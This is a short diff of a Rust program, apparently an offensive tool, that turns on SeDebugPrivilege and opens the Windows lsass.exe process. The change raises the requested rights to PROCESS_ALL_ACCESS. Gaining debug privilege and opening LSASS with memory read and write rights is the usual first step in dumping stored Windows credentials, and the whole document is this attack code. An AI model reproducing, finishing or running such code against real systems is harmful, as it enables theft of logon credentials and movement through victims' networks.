@@ -26,8 +26,8 @@ use windows_sys::{
                 },
             },
             Threading::{
-                GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
-                PROCESS_VM_READ, PROCESS_VM_WRITE,
+                GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
+                PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
             },
             WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
         },
@@ -159,11 +159,7 @@ fn main() {
     println!("[+] SeDebugPrivilege enabled successfully");
 
     unsafe {
-        let lsass_handle = OpenProcess(
-            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-            0,
-            pid,
-        );
+        let lsass_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
 
         if lsass_handle.is_null() {
             println!("[-] Failed to open lsass.exe process");
